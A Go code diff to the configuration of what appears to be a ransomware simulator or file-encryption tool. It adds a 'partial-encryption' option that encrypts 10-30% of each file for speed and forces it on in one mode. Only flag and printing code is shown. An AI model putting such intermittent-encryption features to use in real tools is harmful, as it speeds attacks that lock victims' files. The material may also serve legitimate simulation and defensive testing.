@@ -34,6 +34,7 @@ var (
 	DefaultMaxSizeBytesStr      = "0"
 	DefaultPolicyPathStr        = ""
 	DefaultSimulationModeStr    = "false"
+	DefaultPartialEncryptionStr = "false"
 )
 
 type Config struct {
@@ -60,6 +61,7 @@ type Config struct {
 	PolicyName        string
 	Simulation        bool
 	ActivePolicy      *policy.Policy
+	PartialEncryption bool
 }
 
 func DefaultConfig() *Config {
@@ -95,6 +97,7 @@ func DefaultConfig() *Config {
 		MaxSizeBytes:      parseInt64Or(DefaultMaxSizeBytesStr, 0),
 		PolicyPath:        orString(DefaultPolicyPathStr, ""),
 		Simulation:        parseBoolOr(DefaultSimulationModeStr, false),
+		PartialEncryption: parseBoolOr(DefaultPartialEncryptionStr, false),
 	}
 }
 
@@ -121,6 +124,7 @@ func ParseFlags(appName string) (*Config, error) {
 	flag.Int64Var(&config.MaxSizeBytes, "max-size", config.MaxSizeBytes, "Maximum file size to process in bytes (0 for unlimited)")
 	flag.StringVar(&config.PolicyPath, "policy", config.PolicyPath, "Path to policy YAML for scoped simulations")
 	flag.BoolVar(&config.Simulation, "simulation", config.Simulation, "Enable simulation features (drops decryptor/private key)")
+	flag.BoolVar(&config.PartialEncryption, "partial-encryption", config.PartialEncryption, "Encrypt only critical portions of each file (faster, reduced security)")
 
 	// Confirmation skipping
 	flag.BoolVar(&config.AssumeYes, "yes", config.AssumeYes, "Assume yes; skip confirmation prompts")
@@ -176,6 +180,7 @@ func ParseFlags(appName string) (*Config, error) {
 		config.SystemExclusions = false
 		config.OptimizedIO = false
 		config.DynamicWorkers = false
+		config.PartialEncryption = true
 	}
 
 	// Load policy (CLI path has priority, otherwise embedded definition)
@@ -303,6 +308,7 @@ func (c *Config) PrintConfig(appName string) {
 	fmt.Printf("🚫 System Exclusions: %s\n", map[bool]string{true: "Enabled", false: "Disabled"}[c.SystemExclusions])
 	fmt.Printf("💾 Optimized I/O: %s\n", map[bool]string{true: "Enabled", false: "Disabled"}[c.OptimizedIO])
 	fmt.Printf("📊 Buffer Size: %d KB\n", c.BufferSize/1024)
+	fmt.Printf("✂️  Partial Encryption: %s\n", map[bool]string{true: "Enabled (10-30%% per file)", false: "Disabled"}[c.PartialEncryption])
 	if c.PolicyName != "" {
 		fmt.Printf("📝 Policy: %s (%s)\n", c.PolicyName, c.PolicyPath)
 	} else if c.PolicyPath != "" {
